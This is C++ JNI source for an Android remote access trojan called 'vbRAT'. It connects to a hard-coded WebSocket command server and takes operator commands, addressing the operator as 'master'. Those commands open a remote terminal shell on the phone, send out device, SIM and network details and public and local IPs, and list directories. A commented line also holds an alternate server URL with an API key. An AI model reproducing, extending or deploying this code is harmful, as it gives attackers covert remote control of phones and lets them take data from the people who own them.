#include <jni.h>
#include <string>
#include <ctype.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <list>
#include <string>
#include <dirent.h>
#include "vbConnection.h"
#include "vbDeviceProperties.h"
#include "vbTTY.h"
#include "vbRAT.h"
#include "common.h"

typedef struct
{
    bool tips;
} vbrat_t;

vbrat_t vbRAT;

using namespace std;
//#define SERVER_ADDR "wss://connect.websocket.in/v3/69?apiKey=l7d6CdYNyjLFsRA0uzyFD6Ec0pcPkhKFlYVNwJPeWgTmAIFhZoeM9U5LO3Zi"
#define SERVER_ADDR "wss://vbrat-server.herokuapp.com/zio"

void _printTip(const char *msg)
{
    if(vbRAT.tips)
        vbConnection_Send(msg);
}

void ttyread(char *msg)
{
    vbConnection_Send(msg);
}

void vbRAT_connected()
{
    vbConnection_Send("~Greetings my master");
    vbConnection_Send("~I'm listening to your commands...");
}

void vbRAT_disconnected()
{

}
char pubip[20];
int shellstart=0;
void vbRAT_messageReceived(const char* buf, int len)
{
    std::string cmd = buf;

    if(vbTTY_isOpen())
    {
        if(strcmp(buf, ";shellstop")==0)
        {
            vbTTY_stopShell();
            vbConnection_Send("~Terminal session closed.");
        }
        else
            vbTTY_send(buf);
    }
    else if(strcmp(buf, ";shellstop")==0)
    {
        vbConnection_Send("~You're not into a terminal session :(");
    }
    else if(strcmp(buf, ";shellstart")==0)
    {
        if(!vbTTY_isOpen())
        {
            if(vbTTY_startShell(ttyread))
                vbConnection_Send("~Apologies Master, I cannot open a terminal session");
            else
                vbConnection_Send("~Your terminal session is open.");

        }
    }
    else if(strstr(buf, ";ip="))
    {
        snprintf(pubip, 20, "%s", &buf[4]);
    }
    else if(strcmp(buf, ";getinfo")==0)
    {
        char tosend[512];
        vbPhonePtoperties_t prop = vbDevProp_GetProperties();
        snprintf(tosend, 512, "Country: %s", prop.gsm_country);
        vbConnection_Send(tosend);
        snprintf(tosend, 512, "Manufacturer: %s", prop.dev_manufacturer);
        vbConnection_Send(tosend);
        snprintf(tosend, 512, "Brand: %s", prop.dev_brand);
        vbConnection_Send(tosend);
        snprintf(tosend, 512, "Model: %s", prop.dev_model);
        vbConnection_Send(tosend);
        snprintf(tosend, 512, "Model Name: %s", prop.dev_modelName);
        vbConnection_Send(tosend);
        snprintf(tosend, 512, "SIM Operator: %s", prop.gsm_SIMoperator);
        vbConnection_Send(tosend);
        snprintf(tosend, 512, "Network Operator: %s", prop.gsm_networkOperator);
        vbConnection_Send(tosend);
    }
    else if(strcmp(buf, ";getip")==0)
    {
        char tosend[512];
        std::list<std::string> netDevices[2];
        std::list<std::string>::iterator it;
        std::list<std::string>::iterator it2;
        vbDevProp_getActiveNetworks(netDevices);
        snprintf(tosend, 512, "Public IP: %s", pubip);
        vbConnection_Send(tosend);
        vbConnection_Send("-Local network active interfaces-");
        it2 = netDevices[1].begin();
        for (it = netDevices[0].begin(); it != netDevices[0].end(); it++)
        {
            snprintf(tosend, 512, "%s: IP:%s", it->c_str(), it2->c_str());
            vbConnection_Send(tosend);
            it2++;
        }
    }
    else if(strstr(buf, ";scandir "))
    {
        if(strlen(buf)> strlen(";scandir "))
        {
            char tosend[1024];
            char targetdir[512];
            snprintf(targetdir, 512, "%s", &buf[9]);
            struct dirent **fileListTemp;
            int nof = scandir(targetdir, &fileListTemp, NULL, alphasort);
            if (nof < 0)
                vbConnection_Send("access denied");
            else
            {
                snprintf(tosend, 1024, "~ls %s", targetdir);
                vbConnection_Send(tosend);
                for (int i = 0; i < nof; i++)
                {
                    //snprintf(tosend, 1024, "%s - %d", fileListTemp[i]->d_name, fileListTemp[i]->d_type);
                    snprintf(tosend, 1024, "%s - %d", fileListTemp[i]->d_name,
                             fileListTemp[i]->d_type);
                    vbConnection_Send(tosend);
                }
            }
        }
        else
            vbConnection_Send("Usage: ;scandir \"dir path\" [prints the content of the given directory]");
    }
    else if(strcmp(buf, ";help")==0) //
    {
        char tosend[1024];
        snprintf(tosend, 1024, "%s", "Master, these are all the commands I know: \n");
        strcat(tosend, ";shellstart [turns this into a terminal emulator on device] \n");
        strcat(tosend, ";shellstop [disconnect from the terminal emulator] \n");
        strcat(tosend, ";>C [in terminal mode sends ETX (CTRL+C)] \n");
        strcat(tosend, ";getip [returns informations about the device public IP and its network interfaces]\n");
        strcat(tosend, ";getinfo [prints generic HW info about thre device (Brand, model, etc..)] \n");
        strcat(tosend, ";scandir \"dir path\" [prints the content of the given directory] \n");
        strcat(tosend, ";help [prints this help] \n");
        vbConnection_Send(tosend);
    }
    else
        vbConnection_Send("~Unknown command, how can I ;help you?");

}

//Java_com_example_vbrat_MainActivity_vbRATstart(JNIEnv *env, jobject MainActivity)

extern "C" JNIEXPORT jint JNICALL
Java_com_example_vbrat_service_vbRATstart(JNIEnv *env, jobject MainActivity)
{
    LOGW("Started..");
    vbRAT.tips = true;
    vbConnection_onConnected(vbRAT_connected);
    vbConnection_onDisconnected(vbRAT_disconnected);
    vbConnection_onMessage(vbRAT_messageReceived);
    return(vbConnection_Connect(SERVER_ADDR));
}

extern "C" JNIEXPORT jint JNICALL
Java_com_example_vbrat_service_vbRATstop(JNIEnv *env, jobject MainActivity)
{
    LOGW("Stopped..");
    vbConnection_Send("~Getting disconnected...");
    return 0;
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_vbrat_MainActivity_checkStatus(JNIEnv *env, jobject MainActivity)
{
    vbConnection_getError();
    switch(vbConnection_getState())
    {
        case S_CONNECTED:
            return env->NewStringUTF("CONNECTED...");
            break;
        case S_INIT:
            return env->NewStringUTF("INIT...");
            break;
        case S_RECONNCTING:
        case S_CONNECTING:
            return env->NewStringUTF("CONNECTING...");
            break;
        case S_DISCONNECTED:
            return env->NewStringUTF("DISCONNECTED...");
            break;
        case S_ERROR:
            return env->NewStringUTF("ERROR...");
            break;
        default:
            return env->NewStringUTF("IDLE...");
    }
}
